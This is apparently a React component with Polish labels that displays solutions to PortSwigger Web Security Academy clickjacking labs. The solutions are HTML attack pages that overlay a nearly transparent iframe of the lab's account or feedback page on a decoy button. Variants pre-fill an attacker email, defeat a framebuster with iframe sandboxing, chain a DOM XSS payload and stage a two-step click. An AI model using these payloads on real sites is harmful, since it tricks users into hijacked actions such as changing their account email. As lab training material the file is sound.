const Clickjacking = () =>{
    return(
        <details>
            <summary>Clickjacking</summary>

            <details>
                <summary>Podstawowe clickjacking z ochroną tokenów CSRF</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <br/>
                    <p>{`<html>`}</p>
                    <p className="tab-1">{`<body>`}</p>
                    <p className="tab-2">{`<style>`}</p>
                    <p className="tab-3">{`iframe {`}</p>
                    <p className="tab-4">{`position:relative;`}</p>
                    <p className="tab-4">{`width:$width_value;`}</p>
                    <p className="tab-4">{`height: $height_value;`}</p>
                    <p className="tab-4">{`opacity: 0.00001;`}</p>
                    <p className="tab-4">{`z-index: 2;`}</p>
                    <p className="tab-3">{`}`}</p>
                    <p className="tab-3">{`div {`}</p>
                    <p className="tab-4">{`position:absolute;`}</p>
                    <p className="tab-4">{`top:$top_value;`}</p>
                    <p className="tab-4">{`left:$side_value;`}</p>
                    <p className="tab-4">{`z-index: 1;`}</p>
                    <p className="tab-3">{`}`}</p>
                    <p className="tab-2">{`</style>`}</p>
                    <p className="tab-2">{`<div>Test me</div>`}</p>
                    <p className="tab-2">{`<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>`}</p>
                    <p className="tab-1">{`</body>`}</p>
                    <p>{`<html>`}</p>
                </div>
            </details>

            <details>
                <summary>Clickjacking z danymi wejściowymi formularza wstępnie wypełnionymi z parametru adresu URL</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <br/>
                    <p>{`<html>`}</p>
                    <p className="tab-1">{`<body>`}</p>
                    <p className="tab-2">{`<style>`}</p>
                    <p className="tab-3">{`iframe {`}</p>
                    <p className="tab-4">{`position:relative;`}</p>
                    <p className="tab-4">{`width:$width_value;`}</p>
                    <p className="tab-4">{`height: $height_value;`}</p>
                    <p className="tab-4">{`opacity: 0.00001;`}</p>
                    <p className="tab-4">{`z-index: 2;`}</p>
                    <p className="tab-3">{`}`}</p>
                    <p className="tab-3">{`div {`}</p>
                    <p className="tab-4">{`position:absolute;`}</p>
                    <p className="tab-4">{`top:$top_value;`}</p>
                    <p className="tab-4">{`left:$side_value;`}</p>
                    <p className="tab-4">{`z-index: 1;`}</p>
                    <p className="tab-3">{`}`}</p>
                    <p className="tab-2">{`</style>`}</p>
                    <p className="tab-2">{`<div>Test me</div>`}</p>
                    <p className="tab-2">{`<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>`}</p>
                    <p className="tab-1">{`</body>`}</p>
                    <p>{`<html>`}</p>
                </div>
            </details>

            <details>
                <summary>Clickjacking za pomocą skryptu framebuster</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <br/>
                    <p>{`<html>`}</p>
                    <p className="tab-1">{`<body>`}</p>
                    <p className="tab-2">{`<style>`}</p>
                    <p className="tab-3">{`iframe {`}</p>
                    <p className="tab-4">{`position:relative;`}</p>
                    <p className="tab-4">{`width:$width_value;`}</p>
                    <p className="tab-4">{`height: $height_value;`}</p>
                    <p className="tab-4">{`opacity: 0.00001;`}</p>
                    <p className="tab-4">{`z-index: 2;`}</p>
                    <p className="tab-3">{`}`}</p>
                    <p className="tab-3">{`div {`}</p>
                    <p className="tab-4">{`position:absolute;`}</p>
                    <p className="tab-4">{`top:$top_value;`}</p>
                    <p className="tab-4">{`left:$side_value;`}</p>
                    <p className="tab-4">{`z-index: 1;`}</p>
                    <p className="tab-3">{`}`}</p>
                    <p className="tab-2">{`</style>`}</p>
                    <p className="tab-2">{`<div>Test me</div>`}</p>
                    <p className="tab-2">{`<iframe sandbox="allow-forms" src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>`}</p>
                    <p className="tab-1">{`</body>`}</p>
                    <p>{`<html>`}</p>
                </div>
            </details>

            <details>
                <summary>Wykorzystanie podatności na kliknięcia w celu wywołania ataku XSS opartego na DOM</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <br/>
                    <p>{`<html>`}</p>
                    <p className="tab-1">{`<body>`}</p>
                    <p className="tab-2">{`<style>`}</p>
                    <p className="tab-3">{`iframe {`}</p>
                    <p className="tab-4">{`position:relative;`}</p>
                    <p className="tab-4">{`width:$width_value;`}</p>
                    <p className="tab-4">{`height: $height_value;`}</p>
                    <p className="tab-4">{`opacity: 0.00001;`}</p>
                    <p className="tab-4">{`z-index: 2;`}</p>
                    <p className="tab-3">{`}`}</p>
                    <p className="tab-3">{`div {`}</p>
                    <p className="tab-4">{`position:absolute;`}</p>
                    <p className="tab-4">{`top:$top_value;`}</p>
                    <p className="tab-4">{`left:$side_value;`}</p>
                    <p className="tab-4">{`z-index: 1;`}</p>
                    <p className="tab-3">{`}`}</p>
                    <p className="tab-2">{`</style>`}</p>
                    <p className="tab-2">{`<div>Test me</div>`}</p>
                    <p className="tab-2">{`<iframe src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>`}</p>
                    <p className="tab-1">{`</body>`}</p>
                    <p>{`<html>`}</p>
                </div>
            </details>

            <details>
                <summary>Wieloetapowe klikanie</summary>
                <div className="waring">
                    <p className="result">Rozwiązanie:</p>
                    <br/>
                    <p>{`<html>`}</p>
                    <p className="tab-1">{`<body>`}</p>
                    <p className="tab-2">{`<style>`}</p>
                    <p className="tab-3">{`iframe {`}</p>
                    <p className="tab-4">{`position:relative;`}</p>
                    <p className="tab-4">{`width:$width_value;`}</p>
                    <p className="tab-4">{`height: $height_value;`}</p>
                    <p className="tab-4">{`opacity: 0.00001;`}</p>
                    <p className="tab-4">{`z-index: 2;`}</p>
                    <p className="tab-3">{`}`}</p>
                    <p className="tab-3">{`.firstClick, .secondClick {`}</p>
                    <p className="tab-4">{`position:absolute;`}</p>
                    <p className="tab-4">{`top:$top_value;`}</p>
                    <p className="tab-4">{`left:$side_value;`}</p>
                    <p className="tab-4">{`z-index: 1;`}</p>
                    <p className="tab-3">{`}`}</p>
                    <p className="tab-3">{`.secondClick {`}</p>
                    <p className="tab-4">{`top:$top_value2;`}</p>
                    <p className="tab-4">{`left:$side_value2;`}</p>
                    <p className="tab-3">{`}`}</p>
                    <p className="tab-2">{`</style>`}</p>
                    <p className="tab-2">{`<div class="firstClick">Test me first</div>`}</p>
                    <p className="tab-2">{`<div class="secondClick">Test me first</div>`}</p>
                    <p className="tab-2">{`<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>`}</p>
                    <p className="tab-1">{`</body>`}</p>
                    <p>{`<html>`}</p>
                </div>
            </details>
        </details>
    )
}

export default Clickjacking;